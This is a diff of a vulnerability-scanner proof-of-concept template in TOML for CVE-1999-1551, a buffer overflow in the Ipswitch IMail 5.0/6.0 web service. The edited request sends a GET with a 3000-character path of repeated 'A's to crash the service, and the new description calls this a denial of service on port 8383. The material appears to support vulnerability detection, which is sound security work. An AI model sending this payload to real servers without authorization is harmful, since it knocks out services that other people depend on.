@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "Ipswitch IMail 5.0/6.0 的 Web 服务在处理 HTTP 请求 URL 时未校验长度，发送超长 URL 可触发缓冲区溢出导致服务崩溃。本 PoC 通过向目标 Web 端口发送一个携带超长路径的 GET 请求，观察服务是否返回异常响应或连接被重置/超时（安全无损验证，不持续重放）。"
+description = "验证Ipswitch IMail Web服务缓冲区溢出漏洞(CVE-1999-1551)，通过向IMail Web服务端口8383发送超长URL（3000字符以上）触发缓冲区溢出，导致服务崩溃拒绝服务"
 id = "POC-AVE-1999-1179"
-name = "Ipswitch IMail 5.0/6.0 Web Service Buffer Overflow DoS PoC"
+name = "CVE-1999-1551 PoC"
 severity = "medium"
 tags = ["ave-1999-1179"]
 vuln_id = [
@@ -15,21 +15,14 @@ logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/"
+path = "/{{repeat('A', 3000)}}/"
 protocol = "http"
-
-[poc.requests.body]
-content = ""
-type = "raw"
-
-[poc.requests.headers]
-User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
 status = [
-    500,
     400,
+    500,
     502,
     503,
 ]
